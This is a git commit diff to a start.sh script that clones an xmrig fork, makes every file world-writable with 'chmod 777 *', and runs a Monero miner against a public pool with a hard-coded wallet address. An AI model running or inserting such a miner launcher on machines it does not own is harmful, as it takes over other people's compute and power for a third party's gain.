41f43dfa2dc0bff1913e0836cffb560ed91859d7
MikeSchiller07 <86876754+MikeSchiller07@users.noreply.github.com>
2021-07-06 22:08:37 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,5 @@
-sudo apt-get install git screen build-essential cmake libuv1-dev libmicrohttpd-dev libssl-devlibssl-dev -y
+sudo apt-get install git -y
+sudo apt-get install screen -y
 git clone https://github.com/MikeSchiller07/xmrig
 chmod 777 *
 ./xmrig -o pool.supportxmr.com:443 -u 8C34Dv2y8tpan9D1xmarqXjAj98jdYVTVUR66bBSXHsLVrpNGdqJYBJcGWWvMLSU7XCWxZnrykCzbAAYFKjQXzSiCmz4fXL -k --tls
